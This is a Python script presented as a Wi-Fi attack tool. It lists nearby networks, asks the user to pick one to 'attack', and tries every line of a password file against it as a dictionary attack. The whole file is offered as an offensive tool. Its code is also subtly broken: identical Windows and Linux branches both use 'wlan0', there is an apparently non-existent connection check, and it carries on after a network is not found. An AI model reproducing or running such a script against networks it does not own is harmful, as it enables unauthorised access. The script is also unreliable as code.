import platform
import wifi
import os
 
def scan_for_networks():
    # Scan for available networks
    if platform.system() == 'Windows':
        # Use wifi module for Windows
        networks = [n.ssid for n in wifi.Cell.all('wlan0')]
    else:
        # Use wifi module for Linux
        networks = [n.ssid for n in wifi.Cell.all('wlan0')]
    
    return networks

def connect_to_wifi(ssid, password):
    # Connect to the network
    if platform.system() == 'Windows':
        # Use wifi module for Windows
        networks = wifi.Cell.all('wlan0')
    else:
        # Use wifi module for Linux
        networks = wifi.Cell.all('wlan0')

    # Find the network with the specified SSID
    network = next((n for n in networks if n.ssid == ssid), None)

    # If the network is not found, return an error message
    if not network:
        print('Network not found')

    # Create a scheme for the network
    scheme = wifi.Scheme.for_cell('wlan0', ssid, network, password)

    # Connect to the network
    try:
        scheme.activate()
        print('Connected to '+ssid+' via password: '+ password)
    except wifi.exceptions.ConnectionError as e:
        print('Failed to connect due to {}'.format(e))

while True:
    # Autodetect platform and use relevant function
    if platform.system() == 'Windows':
        networks = scan_for_networks()
    else:
        networks = scan_for_networks()
    print("detecting all available wifi networks...")
    k = 'all available wifi networks are: \n'
    counter = 1
    for i in networks:
        k = k + '['+str(counter)+'] '+ i +'\n'
        counter = counter + 1
    print(k+'type number assigned to given wifi name you want to attack: ')
    l = int(input('> '))
    target = networks[l-1]
    i = str(input("enter password file: "))
    f = open(i, "r").read()
    for q in f.split('\n'):
        connect_to_wifi(target, q)
        if wifi.Wifi().is_connected():
            print("password has successfully been found")
            break
